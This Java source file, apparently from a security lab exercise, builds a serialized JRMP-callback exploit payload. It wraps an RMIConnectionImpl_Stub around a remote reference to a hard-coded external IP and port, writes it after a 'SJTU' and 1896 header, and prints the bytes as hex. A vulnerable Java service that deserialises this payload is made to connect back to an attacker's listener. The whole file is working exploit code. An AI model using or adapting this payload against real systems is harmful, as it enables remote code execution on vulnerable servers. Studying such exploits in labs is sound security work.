package lab7;


import lab1.Utils;
import lab3.JrmpListener;
import lab3.lab3exp;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.DGCImpl_Stub;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import javax.management.remote.rmi.RMIConnectionImpl_Stub;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Proxy;
import java.rmi.registry.Registry;
import java.rmi.server.*;
import java.util.Random;

public class Exp {
    public static void main(String[] args) throws  Exception{
        ObjID id = new ObjID(new Random().nextInt());
        TCPEndpoint tcp = new TCPEndpoint("82.156.2.166", 2333);
        UnicastRef ref = new UnicastRef(new LiveRef(id, tcp, false));
        RMIConnectionImpl_Stub rs = new RMIConnectionImpl_Stub(ref);

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream os = new ObjectOutputStream(bos);
        os.writeUTF("SJTU");
        os.writeInt(1896);
        os.writeObject(rs);
        os.close();
        System.out.println(Utils.bytesTohexString(bos.toByteArray()));
    }
}
